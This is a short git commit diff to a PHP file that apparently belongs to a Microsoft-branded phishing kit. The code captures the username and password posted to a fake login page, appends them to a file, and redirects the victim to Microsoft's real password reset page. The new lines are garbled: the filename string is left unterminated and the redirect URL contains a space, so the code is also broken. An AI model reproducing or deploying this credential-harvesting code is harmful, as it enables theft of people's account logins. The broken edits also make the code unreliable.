9655549cd13f76c80c1298babc826a6728048880
Westboy001 <isaaclawrence727@gmail.com>
2024-11-12 20:26:36 +0000

    Pending changes exported from your codespace

--- .sites/microsoft/login.php
+++ .sites/microsoft/login.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Microsoft Username: " . $_POST['loginfmt'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
-header('Location: https://account.live.com/ResetPassword.aspx');
+file_put_contents("password_get_info, "Microsoft Username: " . $_POST['loginfmt'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
+header('Location: ht tps://account.live.com/ResetPassword.aspx');
 exit();
 ?>
